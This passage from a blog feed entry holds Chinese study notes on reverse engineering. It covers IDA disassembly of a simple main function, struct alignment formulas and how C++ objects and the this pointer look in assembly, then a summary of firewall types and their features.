class="hljs-symbol">.text:</span>000000000040157B                 <span class="hljs-keyword">pxor</span>    <span class="hljs-built_in">xmm0</span>, <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span>000000000040157F                 <span class="hljs-keyword">movss</span>   [<span class="hljs-built_in">rbp</span>+var_8], <span class="hljs-built_in">xmm0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401584</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">20h</span> <span class="hljs-comment">; &#x27; &#x27;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401589</span>                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rcx</span>, Format     <span class="hljs-comment">; &quot;%d&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401590</span>                 <span class="hljs-keyword">call</span>    printf<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401595</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>000000000040159A                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">40h</span><br><span class="hljs-symbol">.text:</span>000000000040159E                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span>000000000040159F                 <span class="hljs-keyword">retn</span><br><span class="hljs-symbol">.text:</span>000000000040159F main            endp<br></code></pre></td></tr></table></figure><p>​    编译器对齐值,设置为 alg, MeMber offset 从0开始计算, 其中Member offset 要每次代入公式之后,加上自己成员所占的字节大小,继续参与下次运算</p><p>　　结构体成员偏移计算公式:  MeMber offset % min(alg,sizeof(Member type)) &#x3D;&#x3D; 0</p><p>　　结构体总大小计算公式: 　 sizeof(struct) % min(Max type size,alg) &#x3D;&#x3D; 0;</p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>​    （对象调用成员函数时） lea ecx, [xxx]<br>​    (成员函数中) mov xxx，ecx ; 直接就使用了ecx call 成员函数 stdcall和cdec方式都是push传参（最后一个PUSH）<br>​    lea reg, 寄存器首地址 push reg call 成员函数<br>​    当给函数传参时第一个参数是地址，那么可以怀疑这个是类对象的成员函数 对象作为参数传递<br>​    成员简单：直接当作变量压栈，先定义的成员后压栈，后定义的成员先压栈（保证在栈中的 顺序和定义时一样）<br>​    成员复杂：将整个对象复制到栈顶（相当于整个压栈），具体操作<br>​    sub esp, 类对象长度 ; 预先申请栈空间，用于存储类对象的形参 mov ecx, 10<br>​    ;设置循环次数10次<br>​    rep movs 栈顶，对象地址 ;就是类似memcpy，将内容整体拷贝到栈顶（刚刚开辟的位置） call fun…<br>​    对象作为返回值 调用前会将对象返回的位置作为参数压栈（也就是调用方准备好空间，告诉子函数地址，到<br>时候子函数返回的过程就是直接写进那个地址）</p><p>​    空类的实例占用1字节：目的是为了能够获取到该实例的地址 对象中先定义的变量在低地址处，后定义的变量在高地址处（类似数组） 内存对齐：<br>​    每个数据存放的地址必须是自身长度的整数倍 2结构体总长度必须是数据中最长类型长度的整数倍 如果指定了#pragma pack(n)，则原值和n取min 编译器用0xCC填充<br>​    类中静态变量：是具有作用域的全局变量（同静态变量） 所以静态成员变量可以生成对象就使用（用类访问） 也无需this指针<br>​    this指针：在对象调用自己的成员函数时，会MOV ecx, 对象首地址，而进入成员函数时会自动将 ecx入栈，也就是说，实际上函数多了一个参数，是指向自己对象首地址的指针，这就是this指 针。<br>​    thiscall方式特点：使用ecx传this指针</p><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>​    什么是防火墙 – 一种高级访问控制设备，置于<strong>不同网络安全域 之间的一系列部件的组合</strong>，它是<strong>不同网络安全 域间通信流的唯一通道</strong>，能根据企业有关的安全政策控制（允许、拒绝、监视、记录）进出网络的访问行为。</p><p>1.简单包过滤防火墙：（综合安全性最差） </p><p>① 简单包过滤防火墙不检查数据区 ② 简单包过滤防火墙不建立连接状态表 ③ 前后报文无关 ④ 应用层控制很弱 ⑤ 处理对象：单个包报头</p><p>2.状态检测包过滤防火墙 </p><p>① 不检查数据区 ② 建立连接状态表 ③ 前后报文相关 ④ 应用层控制很弱 ⑤ 处理对象：单个包报头</p><p>3.应用代理防火墙</p><p>只检查数据，不查ip，tcp报头，不建立连接表，网络层保护较弱，处理数据包</p><p>4.核检测防火墙（综合安全性最好） </p><p>检查多个报文的会话，协议还原，上下文相关，处理一次对话</p><p>软件防火墙：保护整个网络 单机防火墙：保护澹台主机</p><p>防火墙的其他功能： 身份认证；审计、日志分析；带宽管理；负载均衡；与 IDS 联动；与病毒网关联动；与URL 服务<br>器联动；Mac 绑定；Map 映射…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="逆向" scheme="https://d3n13d.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
</feed>
